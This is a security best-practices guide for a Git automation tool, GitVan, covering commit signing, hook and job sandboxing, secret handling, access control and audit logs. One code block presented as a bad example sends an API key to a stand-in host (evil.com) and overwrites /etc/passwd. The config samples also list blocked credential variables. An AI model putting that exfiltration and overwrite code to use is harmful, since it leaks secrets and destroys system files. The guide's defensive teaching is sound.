# GitVan Security Best Practices

**Goal**: Secure your Git workflows with GitVan.

This guide covers security patterns, best practices, and verification mechanisms for working safely with GitVan.

---

## Table of Contents

1. [GPG Signing and Verification](#gpg-signing-and-verification)
2. [Commit Security](#commit-security)
3. [Hook Security](#hook-security)
4. [Job Execution Security](#job-execution-security)
5. [Secret Management](#secret-management)
6. [Access Control](#access-control)
7. [Audit and Logging](#audit-and-logging)
8. [Network Security](#network-security)

---

## GPG Signing and Verification

### Why GPG Signing Matters

GPG signing proves:
- **Authenticity**: Commit came from you
- **Non-repudiation**: You can't deny you made it
- **Integrity**: Commit hasn't been tampered with

### Configuring GPG Signing

**Step 1: Generate or import GPG key**

```bash
# Generate new key
gpg --gen-key

# Or import existing key
gpg --import private-key.asc

# List keys
gpg --list-keys
```

**Step 2: Configure Git to sign commits**

```bash
# Set signing key
git config user.signingkey <KEY_ID>

# Sign all commits by default
git config commit.gpgSign true

# Or for all repositories
git config --global commit.gpgSign true
```

**Step 3: Use GitVan signing**

```javascript
import { withGitVan, useGit } from 'gitvan';

const context = {
  repo: process.cwd(),
  config: {
    policy: {
      requireSignedCommits: true
    }
  }
};

await withGitVan(context, async () => {
  const git = useGit();

  // Commit will be signed automatically
  const sha = await git.commit('feat: new feature', {
    sign: true  // Explicit signing
  });

  console.log(`Signed commit: ${sha}`);
});
```

### Verifying GPG Signatures

```javascript
await withGitVan(context, async () => {
  const git = useGit();

  // Get commit details
  const commit = await git.getCommit('HEAD');

  // Check signature
  if (commit.signed) {
    console.log(`Signed by: ${commit.signer}`);
    console.log(`Verified: ${commit.verified}`);
  } else {
    console.warn('Commit is NOT signed');
  }
});
```

**Block unsigned commits in policy:**

```javascript
// In gitvan.config.js
export default {
  policy: {
    requireSignedCommits: true,
    rejectUnsignedCommits: true,

    // Trusted signers
    trustedSigners: [
      'alice@example.com',
      'bob@example.com'
    ]
  }
};
```

---

## Commit Security

### Secure Commit Messages

**Problem**: Malicious or misleading commit messages.

**Best Practice**:

```javascript
// ✓ GOOD - Clear, descriptive messages
await git.commit('feat: add user authentication', {
  sign: true,
  author: {
    name: 'Alice Developer',
    email: 'alice@example.com'
  }
});

// ✗ BAD - Vague or suspicious messages
await git.commit('fix', { sign: false });  // Too vague
await git.commit('backdoor access', { sign: false });  // Suspicious
```

### Author Verification

**Verify commits come from expected authors:**

```javascript
await withGitVan(context, async () => {
  const git = useGit();
  const receipt = useReceipt();

  // Get commits
  const commits = await git.log({ limit: 10 });

  for (const commit of commits) {
    // Verify author
    if (!isAllowedAuthor(commit.author.email)) {
      await receipt.write({
        type: 'security',
        level: 'warning',
        message: `Commit by unknown author: ${commit.author.email}`,
        commit: commit.sha,
        timestamp: new Date()
      });
    }

    // Verify signature
    if (!commit.verified) {
      await receipt.write({
        type: 'security',
        level: 'error',
        message: 'Unsigned commit detected',
        commit: commit.sha
      });
    }
  }
});

function isAllowedAuthor(email) {
  const allowed = ['alice@example.com', 'bob@example.com'];
  return allowed.includes(email);
}
```

### Commit History Protection

**Prevent force-push that rewrites history:**

```javascript
// In gitvan.config.js
export default {
  policy: {
    // Prevent force push
    allowForcePush: false,

    // Protect main branch
    protectedBranches: ['main', 'master', 'release/*'],

    // Require PR for protected branches
    requirePullRequest: true
  }
};
```

---

## Hook Security

### Validate Hook Definitions

**Only allow trusted hooks:**

```javascript
import { HookParser } from 'gitvan/hooks/HookParser';
import { verifyHookSignature } from 'gitvan/hooks/security';

// Validate hook definition
const hookTtl = `
@prefix : <http://example.org#> .
@prefix hook: <http://example.org/hook#> .

:MyHook a hook:Hook ;
  hook:on [ a git:CommitEvent ] ;
  hook:job [ hook:name "verified-job" ] .
`;

const parser = new HookParser();
const hook = await parser.parse(hookTtl);

// Verify hook signature
const isValid = await verifyHookSignature(hook, {
  trustedIssuers: ['alice@example.com']
});

if (!isValid) {
  throw new Error('Hook signature verification failed');
}
```

### Hook Sandboxing

**Isolate hooks in restricted environment:**

```javascript
// In gitvan.config.js
export default {
  hooks: {
    // Run hooks in isolated worker threads
    isolated: true,

    // Timeout for hook execution
    timeout: 30000,

    // Memory limit per hook
    memoryLimit: '128mb',

    // Environment isolation
    env: 'sandbox'
  }
};
```

### Restrict Hook Capabilities

```turtle
@prefix : <http://example.org#> .
@prefix hook: <http://example.org/hook#> .

:LimitedHook a hook:Hook ;
  hook:on [ a git:CommitEvent ] ;
  hook:job [
    hook:name "safe-job" ;
    hook:capabilities [
      hook:canReadRepo true ;
      hook:canWriteRepo false ;    # Cannot modify repo
      hook:canAccessNetwork false ;  # No network access
      hook:canAccessSecrets false   # No secret access
    ]
  ] .
```

---

## Job Execution Security

### Sandboxed Job Execution

**Run jobs in isolated environment:**

```javascript
// In gitvan.config.js
export default {
  jobs: {
    // Enable sandboxing
    sandbox: true,

    // Worker thread pool size
    workers: 4,

    // Environment variables (whitelist)
    allowedEnv: [
      'NODE_ENV',
      'LOG_LEVEL',
      'CUSTOM_VAR'
    ],

    // Forbidden environment variables
    blockedEnv: [
      'AWS_ACCESS_KEY_ID',
      'DATABASE_PASSWORD',
      'GITHUB_TOKEN'
    ]
  }
};
```

### Secure Job Definition

```javascript
// ✓ GOOD - Minimal permissions
export default async function safeJob(context) {
  // Only read repo state
  const { repo } = context;

  // Don't access secrets
  // Don't modify files
  // Don't make network requests

  return { success: true, data: repo };
}
```

```javascript
// ✗ BAD - Dangerous permissions
export default async function unsafeJob(context) {
  // Reads secrets from environment
  const apiKey = process.env.API_KEY;

  // Makes network requests
  const response = await fetch('https://evil.com', {
    body: JSON.stringify({ apiKey })
  });

  // Modifies file system
  fs.writeFileSync('/etc/passwd', 'hacked');

  return { success: true };
}
```

### Input Validation in Jobs

```javascript
export default async function validateInputJob(context) {
  // Always validate input
  const { commit, branch } = context;

  // Validate branch name
  if (!/^[a-zA-Z0-9\-_/]+$/.test(branch)) {
    throw new Error(`Invalid branch name: ${branch}`);
  }

  // Validate commit SHA
  if (!/^[a-f0-9]{40}$/.test(commit)) {
    throw new Error(`Invalid commit SHA: ${commit}`);
  }

  return { success: true };
}
```

---

## Secret Management

### Never Store Secrets in Code

**✗ BAD: Secrets in code**
```javascript
// ✗ DO NOT DO THIS
export default async function badJob() {
  const dbPassword = 'super_secret_password_12345';
  const apiKey = 'sk_live_51234567890abcdef';

  await connectDatabase(dbPassword);
  await callApi(apiKey);
}
```

**✓ GOOD: Secrets from environment**
```javascript
// ✓ DO THIS
export default async function goodJob() {
  const dbPassword = process.env.DB_PASSWORD;
  const apiKey = process.env.API_KEY;

  if (!dbPassword || !apiKey) {
    throw new Error('Required secrets not configured');
  }

  await connectDatabase(dbPassword);
  await callApi(apiKey);
}
```

### Use Secret Management Services

```javascript
import { SecretsManager } from 'aws-sdk';

export default async function awsSecretJob() {
  const secretsManager = new SecretsManager();

  // Retrieve secret at runtime
  const secret = await secretsManager.getSecretValue({
    SecretId: 'gitvan/api-key'
  }).promise();

  const apiKey = JSON.parse(secret.SecretString).apiKey;

  // Use secret
  return { success: true };
}
```

### Environment Variable Protection

```javascript
// In gitvan.config.js
export default {
  jobs: {
    // Whitelist allowed environment variables
    allowedEnv: [
      'NODE_ENV',
      'LOG_LEVEL',
      'APP_NAME'
    ],

    // Explicitly block sensitive variables
    blockedEnv: [
      'AWS_ACCESS_KEY_ID',
      'AWS_SECRET_ACCESS_KEY',
      'GITHUB_TOKEN',
      'DATABASE_PASSWORD',
      'API_KEY',
      'PRIVATE_KEY'
    ]
  }
};
```

---

## Access Control

### Role-Based Access

**Define who can execute what:**

```javascript
// In gitvan.config.js
export default {
  rbac: {
    enabled: true,

    // Role definitions
    roles: {
      admin: {
        permissions: ['*']  // All permissions
      },

      maintainer: {
        permissions: [
          'job:execute',
          'workflow:execute',
          'branch:create',
          'branch:delete'
        ]
      },

      developer: {
        permissions: [
          'job:execute',
          'workflow:execute',
          'branch:create'
        ]
      },

      readonly: {
        permissions: [
          'job:list',
          'workflow:list',
          'branch:list'
        ]
      }
    },

    // User role mappings
    userRoles: {
      'alice@example.com': 'admin',
      'bob@example.com': 'maintainer',
      'charlie@example.com': 'developer'
    }
  }
};
```

### Branch Protection Rules

```javascript
// In gitvan.config.js
export default {
  branches: {
    protected: {
      'main': {
        requirePullRequest: true,
        requireApprovals: 2,
        requireSignedCommits: true,
        allowForcePush: false,
        dismissStaleReviews: false
      },

      'develop': {
        requirePullRequest: true,
        requireApprovals: 1,
        requireSignedCommits: false,
        allowForcePush: false
      }
    }
  }
};
```

---

## Audit and Logging

### Audit Trail Creation

**Record all security-relevant actions:**

```javascript
await withGitVan(context, async () => {
  const receipt = useReceipt();

  // Log commit
  await receipt.write({
    type: 'action',
    action: 'commit',
    user: 'alice@example.com',
    branch: 'main',
    commit: sha,
    message: 'feat: add security',
    timestamp: new Date(),
    signed: true,
    verified: true
  });

  // Log job execution
  await receipt.write({
    type: 'action',
    action: 'job:execute',
    user: 'bob@example.com',
    job: 'security-check',
    status: 'success',
    timestamp: new Date(),
    duration: 1234
  });

  // Log hook trigger
  await receipt.write({
    type: 'action',
    action: 'hook:trigger',
    hook: 'pre-commit',
    event: 'commit',
    branch: 'feature/auth',
    timestamp: new Date()
  });
});
```

### Verify Audit Trail

```javascript
import { Receipt } from 'gitvan/composables/receipt';

const receipt = new Receipt();

// Get all audit entries
const entries = await receipt.read('refs/notes/gitvan/audit');

// Filter by type
const commits = entries.filter(e => e.action === 'commit');
const jobs = entries.filter(e => e.action?.startsWith('job:'));

// Detect suspicious activity
const unsigned = entries.filter(e => !e.signed);
if (unsigned.length > 0) {
  console.warn(`Found ${unsigned.length} unsigned commits`);
}
```

### Immutable Audit Logs

**Store logs in Git for immutability:**

```javascript
// In gitvan.config.js
export default {
  receipts: {
    // Store in Git notes (immutable)
    ref: 'refs/notes/gitvan/audit',

    // Sign each entry
    signEntries: true,

    // Retention period
    retention: '90 days',

    // Archive to external service
    archiveService: 'aws-s3'
  }
};
```

---

## Network Security

### Secure Remote Operations

**Use SSH instead of HTTPS where possible:**

```bash
# Configure to use SSH
git config --global url."git@github.com:".insteadOf "https://github.com/"
```

**Verify remote URLs:**

```javascript
await withGitVan(context, async () => {
  const git = useGit();

  // Get remotes
  const remotes = await git.remotes();

  // Verify they're trusted
  for (const remote of remotes) {
    const url = remote.url;

    // Only allow known hosts
    if (!isTrustedRemote(url)) {
      throw new Error(`Untrusted remote: ${url}`);
    }
  }
});

function isTrustedRemote(url) {
  const trusted = [
    'git@github.com:company/repo.git',
    'https://github.com/company/repo.git'
  ];
  return trusted.some(t => url.includes(t));
}
```

### TLS/SSL Configuration

```javascript
// Enforce TLS for all operations
import https from 'https';

const httpsAgent = new https.Agent({
  rejectUnauthorized: true,
  minVersion: 'TLSv1.2'
});

// Use in fetch calls
fetch(url, {
  agent: httpsAgent
});
```

---

## Security Checklist

Before deploying workflows:

- [ ] All commits signed with GPG
- [ ] Hook definitions validated and signed
- [ ] Jobs run in sandboxed environment
- [ ] Secrets not stored in code
- [ ] Environment variables whitelisted
- [ ] Audit trail enabled
- [ ] Branch protection configured
- [ ] Role-based access enforced
- [ ] Network TLS enabled
- [ ] Audit logs archived
- [ ] Trusted signers configured
- [ ] Force-push disabled on main

---

## Security Incident Response

### If Credentials Leaked

1. **Immediately rotate credentials**
   ```bash
   # Revoke GitHub token
   # Rotate database passwords
   # Update API keys
   ```

2. **Audit access logs**
   ```javascript
   const entries = await receipt.read('refs/notes/gitvan/audit');
   const recentAccess = entries.filter(e =>
     new Date(e.timestamp) > leakTime
   );
   ```

3. **Invalidate tokens**
   ```javascript
   await receipt.write({
     type: 'security',
     level: 'critical',
     action: 'credentials:revoked',
     reason: 'credential leak',
     timestamp: new Date()
   });
   ```

---

## Additional Resources

- **OWASP Security**: https://owasp.org/
- **Git Security**: https://git-scm.com/book/en/v2/Git-Tools-Signing-Your-Work
- **GPG Documentation**: https://www.gnupg.org/documentation/
- **NIST Cybersecurity**: https://www.nist.gov/

---

**Last Updated**: January 9, 2026
**Version**: 4.0.1
